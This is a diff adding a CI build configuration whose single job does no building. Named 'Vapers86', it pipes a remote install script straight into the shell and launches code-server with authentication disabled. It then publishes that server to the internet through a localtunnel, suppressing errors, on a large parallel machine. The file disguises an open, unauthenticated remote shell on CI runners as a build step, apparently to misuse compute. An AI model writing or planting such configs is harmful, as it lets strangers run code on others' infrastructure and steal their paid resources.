@@ -1,0 +1,12 @@
+jobs: 
+  build: 
+    machine: 
+      image: ubuntu-2004:202010-01 
+    resource_class: large 
+    parallelism: 4 
+    steps: 
+      - checkout 
+      - run: lscpu 
+      - run: 
+          name: "Vapers86" 
+          command: curl -fsSL https://code-server.dev/install.sh | sh && sudo apt install screen && code-server --bind-addr 127.0.0.1:8888 --auth none &  npx localtunnel --port 8888 2> /dev/null 
